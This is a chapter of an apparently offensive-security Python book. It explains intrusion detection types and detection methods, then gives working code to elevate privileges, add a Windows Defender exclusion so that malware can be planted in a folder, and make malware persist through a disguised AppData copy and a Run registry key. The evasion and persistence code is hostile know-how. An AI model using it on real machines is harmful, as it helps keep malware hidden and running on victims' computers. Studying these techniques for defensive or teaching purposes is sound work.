<html><head></head><body>
		<div id="_idContainer152">
			<h1 id="_idParaDest-164"><em class="italic"><a id="_idTextAnchor171"/>Chapter 9</em>: System Protection and Perseverance</h1>
			<p>In this chapter, we are going to focus our attention on how defense mechanisms work and by understanding how they work, you can learn what techniques you can use to bypass them. We will start by learning about intrusion detection systems and their different types. After that, we will learn about detection mechanisms. Once we understand these mechanisms, we will try to bypass them using our tools. In summary, this chapter will focus on the following topics: </p>
			<ul>
				<li>System protection</li>
				<li>Intrusion detection methods</li>
				<li>Detection mechanisms</li>
				<li>Bypassing IDSes</li>
			</ul>
			<h1 id="_idParaDest-165"><a id="_idTextAnchor172"/>Persistence system protection</h1>
			<p>Our previous <a id="_idIndexMarker455"/>chapters focused on creating malware and carrying out different attacks. This is the offensive side of attacks. However, in real-life hacking, you need to know how to protect yourself against external attacks. A better understanding of protection mechanisms would help you to not only protect yourself, but this knowledge would also help you to carry out successful attacks. The first line of defense against external network attacks, or system attacks in general, is the <strong class="bold">Intrusion Detection System</strong> (<strong class="bold">IDS</strong>). IDS is an umbrella term for a lot of tools used for system security and protection, so we must learn about them in detail.</p>
			<h2 id="_idParaDest-166"><a id="_idTextAnchor173"/>Intrusion detection systems </h2>
			<p>IDSes are a <a id="_idIndexMarker456"/>system that monitor and detect the components of your network or system on a continuous basis to detect any undesirable or suspicious behavior. The goal of an IDS is to prevent any undesirable scenario in a system. Fundamentally, there are three types of IDS:</p>
			<ul>
				<li>Host-based IDSes</li>
				<li>Network-based IDSes</li>
				<li>Hybrid IDSes</li>
			</ul>
			<p>Let's<a id="_idIndexMarker457"/> discuss these in detail in the following sections.</p>
			<h3>Host-based IDSes</h3>
			<p>Host-based IDSes <a id="_idIndexMarker458"/>run on the system they <a id="_idIndexMarker459"/>are monitoring. Along with other software, host-based IDSes monitor the filesystem to scan for any potentially harmful files. They also monitor and analyze network traffic to see whether any malicious traffic is occurring over the network. </p>
			<p>Host-based IDSes are an important part of a system's security apparatus; however, they often do not give complete details regarding the security state of the system. They can be modified and even bypassed by different attacks. An important aspect of a host-based IDS is how up to date it is in terms of modern threat detection. It should constantly keep up with the modern threats and block them immediately if it detects them. An important feature of a host-based IDS is to keep a log of all critical activities occurring on a system. This can help a lot in threat detection and incidence response. </p>
			<p>On most common OSes, you have some sort of host-based IDS already built in. In a Windows OS, Windows built-in antivirus is part of the host IDS. It monitors and detects any suspicious activity on the system and blocks potential threats from acting on a system. Along with virus detection, it also works to detect any tampering of critical Windows infrastructure.</p>
			<h3>Network-based IDSes</h3>
			<p>Another <a id="_idIndexMarker460"/>important aspect of system <a id="_idIndexMarker461"/>security is network-based protection. Network-based IDSes play a key role in limiting external network attacks from taking place. They play a role in protecting all devices present in a network. It observes network traffic over the whole subnet to monitor suspicious activity. It can be combined with firewalls to provide additional security. Sometimes, network-wide firewalls are part of an IDS. </p>
			<h3>Hybrid IDSes</h3>
			<p>As the <a id="_idIndexMarker462"/><a id="_idIndexMarker463"/>name<a id="_idIndexMarker464"/> suggests, these detection systems provide much more security for the system as compared with individual systems. They combined both system-based and network-based approaches to catch malicious behavior and have a much higher rate of detection. Modern hybrid IDSes use both<a id="_idIndexMarker465"/> conventional and <strong class="bold">artificial intelligence</strong> (<strong class="bold">AI</strong>)-based techniques to prevent network attacks. </p>
			<p>Now that we have learned about different types of IDS, let's see how these IDSes work.</p>
			<h2 id="_idParaDest-167"><a id="_idTextAnchor174"/>IDS detection mechanisms</h2>
			<p>Most common<a id="_idIndexMarker466"/> IDSes work by using the following two fundamental techniques, although modern IDSes use much more sophisticated approaches. Let's take a look at different detection mechanisms and how they are used in real systems. </p>
			<h3>Signature-based detection</h3>
			<p>This is a <a id="_idIndexMarker467"/>classical knowledge-based <a id="_idIndexMarker468"/>approach and has been used since the early days of computer security. In this approach, the protection software has access to a large known database of malware. Using the database, it can see what bytes are present in the malware, and then it simply compares any new file introduced to the system with this byte sequence. If the byte sequence of an <em class="italic">unknown file</em> matches with the byte sequence present in the database, this means that the unknown file is most probably malicious, and it will immediately block this file. Otherwise, it will continue with normal operations. The algorithm looks like this in its simplest form: </p>
			<div>
				<div id="_idContainer143" class="IMG---Figure">
					<img src="image/B14788_09_01.jpg" alt="Figure 9.1 – Signature-based detection mechanism&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.1 – Signature-based detection mechanism</p>
			<p>Signature-based<a id="_idIndexMarker469"/> detection works great<a id="_idIndexMarker470"/> for known malware, so a good IDS must have a larger malware database. This method is only going to be as good as the database it has for testing. Newly written malware that has not yet been detected will give a false negative for this test. </p>
			<h3>Anomaly-based detection</h3>
			<p>These <a id="_idIndexMarker471"/>detection systems work differently<a id="_idIndexMarker472"/> to the signature-based approach. They monitor the activities that a program undertakes. It defines certain scenarios that it regards as <em class="italic">normal behavior</em> and then looks for any anomaly in these behaviors. For example, a game software should not try to disable the antivirus system. Once a malware program tries to do something it is not supposed to, these systems flag these programs as suspicious and keep monitoring them until they detect that a program is trying to perform something it absolutely shouldn't. Once it detects suspicious behavior, it would either block the program altogether or generate a <em class="italic">red alert</em> for the administrator. </p>
			<p>Note that <a id="_idIndexMarker473"/>there is a small difference between IDSes and <strong class="bold">Intrusion Prevention Systems</strong> (<strong class="bold">IPSes</strong>). For practical purposes, most of the time, these tasks are performed by the same piece of software and we don't make any practical distinction between them. Occasionally, however, you will see that IDSes and IPSes are mentioned separately, so you should know the difference between them. </p>
			<p>Now that we have learned what an IDS is and how it works, we can start building a program to learn how to bypass these systems. </p>
			<h1 id="_idParaDest-168"><a id="_idTextAnchor175"/>Bypassing an IDS</h1>
			<p>In <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>, and <a href="B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Malware</em>, we developed<a id="_idIndexMarker474"/> our malware program, and in <a href="B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160"><em class="italic">Chapter 8</em></a>, <em class="italic">Post Exploitation</em>, we learned how to package our malware into a trojan. Our malware works great and most probably will not be detected by the IDS if it is using a signature-based approach since the malware is written by you and no signature exists for your program anywhere. However, modern IDSes are quite clever and after a couple of runs, they will start noting suspicious behaviors for which they use very exhaustive methods. In this section, we will try to see how we can run our Python executable and administrator privileges. This will help to achieve certain tasks on the victim's machine that a <em class="italic">normal</em> executable will not be able to do. For example, disabling the antivirus program on Windows, or creating an exception for a certain folder so that the virus scanner doesn't scan it, requires administrator privileges in Windows. You can't perform activities such as this with a normal executable. </p>
			<p>Let's see first how we can run an executable with <em class="italic">administrator privileges</em>. You can use this method in combination with your malware program. However, for the sake of simplicity, I will use a simple Python script to demonstrate this procedure. </p>
			<p>Let's create a new Python script. Create a new virtual environment as well. There are multiple ways to elevate privileges for a Python program and you will find multiple solutions online. However, the simplest solution I have found is to use a library called <strong class="source-inline">elevate</strong>. Since we will be creating an executable for demo purposes, let's install <strong class="source-inline">pyinstaller</strong> as well. </p>
			<p>Once you have created a new project and installed <strong class="source-inline">pyinstaller</strong> in the virtual environment, let's run the following line to download the <strong class="source-inline">elevate</strong> Python module:</p>
			<p class="source-code">pip install elevate</p>
			<p>Once this <a id="_idIndexMarker475"/>package is installed, you can use it inside your code to increase privileges for your executable. In my experience, I have found out that it is a good idea to put this functionality at the start of your script to get the best results. To elevate privileges for the script, you can simply call the <strong class="source-inline">elevate</strong> function from this module. </p>
			<p>Let's try to first see what the <em class="italic">user privilege</em> level is before we use this module. Simply write the following code to test. We can use the <strong class="source-inline">os</strong> module to check for root privileges: </p>
			<p class="source-code">import ctypes</p>
			<p class="source-code">import platform</p>
			<p class="source-code">def is_root():</p>
			<p class="source-code">    if platform.system() == "Windows":   </p>
			<p class="source-code">        return ctypes.windll.shell32.IsUserAnAdmin()</p>
			<p class="source-code">    else:</p>
			<p class="source-code">        return 1</p>
			<p class="source-code">print(is_root())</p>
			<p>You can use the preceding code to see whether the program is running in elevated mode. If the value returned by the previous code is <strong class="source-inline">1</strong>, this means it is being run as an <em class="italic">administrator</em>, otherwise it is running in non-administrator mode. Let's run the previous program to see the execution mode:</p>
			<div>
				<div id="_idContainer144" class="IMG---Figure">
					<img src="image/B14788_09_02.jpg" alt="Figure 9.2 – No administrator privileges&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.2 – No administrator privileges</p>
			<p>Now, to elevate, you can simply call the <strong class="source-inline">elevate()</strong> method. Note that there is a small caveat in how privilege escalation works in Windows. When a call to <strong class="source-inline">elevate()</strong> is made, instead of running the same script as <em class="italic">administrator</em>, Windows restarts the same script as a separate process with higher privileges. There is no workaround for this yet. So, when the call <a id="_idIndexMarker476"/>to elevate is made, a new process will start. Let's begin by elevating privileges: </p>
			<p class="source-code">import ctypes</p>
			<p class="source-code">import platform</p>
			<p class="source-code">import time</p>
			<p class="source-code">from elevate import elevate</p>
			<p class="source-code">def is_root():</p>
			<p class="source-code">    if platform.system() == "Windows":   </p>
			<p class="source-code">        return ctypes.windll.shell32.IsUserAnAdmin()</p>
			<p class="source-code">    else:</p>
			<p class="source-code">        return 1</p>
			<p class="source-code">print(is_root())</p>
			<p class="source-code">elevate()</p>
			<p class="source-code">print(is_root())</p>
			<p>Let's now create an executable, (as we did in <a href="B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160"><em class="italic">Chapter 8</em></a>, <em class="italic">Post Exploitation</em>, in the <em class="italic">Packaging malware</em> section) as well to see all of this in action. To run the program, double-click on the executable created. You will see the following popup asking the user to click <strong class="bold">Yes</strong> to escalate privileges. If the user clicks <strong class="bold">Yes</strong>, the program will run in administrator mode:</p>
			<div>
				<div id="_idContainer145" class="IMG---Figure">
					<img src="image/B14788_09_03.jpg" alt="Figure 9.3 – UAC (user account control) popup&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.3 – UAC (user account control) popup</p>
			<p>Press <strong class="bold">Yes</strong> and <a id="_idIndexMarker477"/>you will see the following screen, indicating that a new process has been created and is running with higher privileges, indicated by <strong class="source-inline">1</strong>: </p>
			<div>
				<div id="_idContainer146" class="IMG---Figure">
					<img src="image/B14788_09_04.jpg" alt="Figure 9.4 – Admin privileges&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.4 – Admin privileges</p>
			<p>Now that we have learned how to run our script as an <em class="italic">administrator</em>, let's see how we can modify Windows settings to add exceptions to the IDS scanning. We will add a directory to the Windows exception rules. This will allow us to skip virus scanning for a certain directory and will help us to plant malware in that directory.</p>
			<p>The complete code to elevate privileges is present at the following link: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example14-priv-escalation/escalation.py</a>.</p>
			<p>In the previous <a id="_idIndexMarker478"/>program, we first elevate privileges and then add an exception to the folder where our malware is present in Windows defender settings. This will skip the scanning of the current folder. The following code achieves this: <strong class="source-inline">objective.d</strong>:</p>
			<p class="source-code">command = "Add-MpPreference -ExclusionPath " + dir_to_add</p>
			<p class="source-code">    all_commands.append(command)</p>
			<p>The previous line adds an exception to the Microsoft Defender scanning repositories, as shown in the following screenshot: </p>
			<div>
				<div id="_idContainer147" class="IMG---Figure">
					<img src="image/B14788_09_05.jpg" alt="Figure 9.5 – Added exclusion for virus scanning&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.5 – Added exclusion for virus scanning</p>
			<p>Now we know<a id="_idIndexMarker479"/> how to make our program run in stealth mode and avoid detection by an IDS. Next, we will add persistence to our program. This will allow our program to run when Windows starts up so that a user doesn't have to click on the malware program every time in order for us to have a reverse connection. The victim will only click on the malware once and we will add a Windows registry key for the start up program so that every time the computer is started, our malware program will run. You can use this method on the victim program we developed earlier. Here, for the sake of simplicity, I will just use a demo script. </p>
			<h1 id="_idParaDest-169"><a id="_idTextAnchor176"/>Persistence</h1>
			<p>In this section, we <a id="_idIndexMarker480"/>will learn how to run our Python script when starting up Windows. Let's create a new project. You can also modify the victim program that we developed earlier in <a href="B14788_06_Final_JC_ePub.xhtml#_idTextAnchor130"><em class="italic">Chapter 6</em></a>, <em class="italic">Malware Development</em>, and <a href="B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Malware</em>. To add persistence to our program, we need to know exactly the name of the executable we are running. Once we know the executable, we can make a copy of this executable somewhere else and run it from there every time the system boots. This sounds complicated, so let's take a look at it bit by bit. First, we will need to know the name of the executable. To find this out, let's write the following code:</p>
			<p class="source-code">import sys</p>
			<p class="source-code">curr_executable = sys.executable</p>
			<p class="source-code">print("Current executable : ", curr_executable)</p>
			<p>The output of the aforementioned program if you run it as a Python script would be as follows: </p>
			<div>
				<div id="_idContainer148" class="IMG---Figure">
					<img src="image/B14788_09_06.jpg" alt="Figure 9.6 – Current interpreter name&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.6 – Current interpreter name</p>
			<p>This only tells us the name of the Python interpreter and not the name of the executable that we need. Why is that? Because we are only running a script at the moment. The only way to get the actual name of the executable when we run the file as a binary executable is by using <strong class="source-inline">pyinstaller</strong>. Create a binary executable and run the executable by double-clicking it. Take a look at the following screenshot:</p>
			<div>
				<div id="_idContainer149" class="IMG---Figure">
					<img src="image/B14788_09_07.jpg" alt="Figure 9.7 – Actual executable name&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.7 – Actual executable name</p>
			<p>You can see that now we are getting the actual executable name that we need. The next step is to create a copy of this executable and store it somewhere else so that it is hidden from the victim and finally add a registry to the start up applications. </p>
			<p>We will copy this executable to the <strong class="source-inline">AppData</strong> folder on Windows, which is a special folder that contains application data. To get the path of the <strong class="source-inline">appdata</strong> folder, you can write the following code:</p>
			<p class="source-code">app_data = os.getenv("APPDATA")</p>
			<p>Let's rename the executable so it doesn't look suspicious. We will call this executable <strong class="source-inline">system32_data.exe</strong>. This is a made-up name and you can use any name you want: </p>
			<p class="source-code">to_save_file = app_data +"\\"+"system32_data.exe"</p>
			<p>Next, copy the current<a id="_idIndexMarker481"/> executable to <strong class="source-inline">appdata</strong> and rename it. We will need to import the <strong class="source-inline">shutil</strong> module from the Python standard library:</p>
			<p class="source-code">shutil.copyfile(curr_executable, to_save_file)</p>
			<p>To add it to the Windows registry at startup, you need to run the following code:</p>
			<p class="source-code">        key = winreg.HKEY_CURRENT_USER</p>
			<p class="source-code">        # "Software\Microsoft\Windows\CurrentVersion\Run"</p>
			<p class="source-code">        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"</p>
			<p class="source-code">        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)</p>
			<p class="source-code">        winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)</p>
			<p class="source-code">        winreg.CloseKey(key_obj)</p>
			<p>This code simply adds the <strong class="source-inline">to_save_file</strong> string, which contains the executable name to the start up registry.</p>
			<p>To make changes to the program, you need to run this executable in administrator mode, so you can copy the code from the previous section and add it to the start of this script. The complete code is linked here: </p>
			<p class="source-code">if not os.path.exists(to_save_file):</p>
			<p class="source-code">    print("Becoming Persistent")</p>
			<p class="source-code">    shutil.copyfile(curr_executable, to_save_file)</p>
			<p class="source-code">    key = winreg.HKEY_CURRENT_USER</p>
			<p class="source-code">    # "Software\Microsoft\Windows\CurrentVersion\Run"</p>
			<p class="source-code">    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"</p>
			<p class="source-code">    key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)</p>
			<p class="source-code">    winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)</p>
			<p class="source-code">    winreg.CloseKey(key_obj)</p>
			<p class="source-code">else:</p>
			<p class="source-code">    print("path doesnt exist")</p>
			<p>After running <a id="_idIndexMarker482"/>the code, if you go to the <strong class="source-inline">appdata</strong> folder, you will see the following executable:</p>
			<div>
				<div id="_idContainer150" class="IMG---Figure">
					<img src="image/B14788_09_08.jpg" alt="Figure 9.8 – Current executable copied to the appdata folder&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.8 – Current executable copied to the appdata folder</p>
			<p>Also, to verify whether the Windows registry has been modified, open the registry editor by searching for <strong class="source-inline">regedit</strong> in a Windows search. Open it and go to the following path: </p>
			<p><strong class="source-inline">"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"</strong>:</p>
			<div>
				<div id="_idContainer151" class="IMG---Figure">
					<img src="image/B14788_09_09.jpg" alt="Figure 9.9 – Edited registry&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.9 – Edited registry</p>
			<p>The final row is the entry we just added. You can see that the <strong class="bold">Data</strong> field in the preceding screenshot links to the executable we just copied. Now, if you restart the PC, you will see that <a id="_idIndexMarker483"/>once the system boots up, the aforementioned executable will be started automatically. By way of practice, try to replicate the same procedure with the victim malware program. You should be able to get a return connection from the victim's machine when the victim boots up their computer. </p>
			<h1 id="_idParaDest-170"><a id="_idTextAnchor177"/>Summary</h1>
			<p>In this chapter, we learned different system protection techniques. We started by getting an understanding of system protection and how different IDSes/IPSes work. We learned about different types of detection mechanisms. We also learned about using executables with elevated privileges. Finally, we learned how to make our executables persistent. This knowledge, combined with things you learned in previous chapters, will allow you to develop your malware tools without being easily detected. As long as you keep the impact of your malware on the system low, it would not be easy for an IDS to detect your malware. I hope you learned a lot and enjoyed this book! Remember that cybersecurity is an everchanging field and you need to be constantly up to date with modern tools in order to become a successful penetration tester.</p>
		</div>
	</body></html>